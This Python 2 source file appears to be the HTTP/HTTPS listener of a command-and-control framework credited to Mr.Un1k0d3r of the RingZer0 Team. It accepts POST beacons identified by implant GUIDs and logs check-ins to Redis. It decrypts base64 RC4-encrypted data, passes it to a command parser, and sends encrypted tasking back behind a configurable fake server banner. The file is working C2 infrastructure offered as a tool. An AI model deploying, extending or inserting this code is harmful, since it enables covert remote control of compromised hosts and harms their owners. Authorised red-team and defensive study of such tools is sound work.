"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/httpd.py
"""
import BaseHTTPServer
import base64
import ssl
from threading import Thread
from core.log import Log
from core.ui import UI
from core.rc4 import RC4
from core.parser import HTTPDParser
from core.utils import Utils

def HTTPDFactory(config):
    
    class HTTPD(BaseHTTPServer.BaseHTTPRequestHandler, object):
        def __init__(self, *args, **kwargs):
            self.config = config
            self.server_version = self.config.get("http-server")
            self.sys_version = ""
            self.rc4 = RC4(self.config.get("encryption-key"))
            self.db = self.config.get("redis")
            self.output = ""
            
            super(HTTPD, self).__init__(*args, **kwargs)
        
        def set_http_headers(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            
        def do_POST(self):
            guid = ""
            try:
                guid = self.path.split('?', 1)[1]
            except:
                Log.log_error("Invalid request no GUID", self.path)
                self.return_data()
                return
                
            self.db.update_checkin(guid)
        
            length = int(self.headers.getheader("Content-Length"))
            data = self.rfile.read(length)
            try:
                data = self.rc4.crypt(base64.b64decode(data))
            except:
                Log.log_error("Invalid base64 data received", self.path)
                self.return_data()
                return 
            
            parser = HTTPDParser(config)
            self.output = base64.b64encode(self.rc4.crypt(parser.parse_cmd(guid, data)))
            
            self.return_data()
            
        def do_GET(self):
            Log.log_error("Invalid request got a GET request", self.path)
            self.return_data()
            
        def return_data(self):
            self.set_http_headers()
            self.wfile.write(self.output) 
            
        def log_message(self, format, *args):
            Log.log_http_request(self.client_address[0], self.address_string(), args[0])
            return
        
    return HTTPD
        
def init_httpd_thread(config):
    thread = Thread(target=start_httpd, args=(config,))
    thread.start()
    return thread
    
def start_httpd(config):
    ip = config.get("http-host")
    port = int(config.get("http-port"))
    
    UI.success("Starting web server on %s port %d" % (ip, port))
    
    server_class = BaseHTTPServer.HTTPServer
    factory = HTTPDFactory(config)
    httpd_server = server_class((ip, port), factory)
    if config.get("https-enabled") == "on":
        cert = config.get("https-cert-path")
        Utils.file_exists(cert, True)
        
        httpd_server.socket = ssl.wrap_socket(httpd_server.socket, certfile=cert)
        UI.success("Web server is using HTTPS")
        
    httpd_server.serve_forever()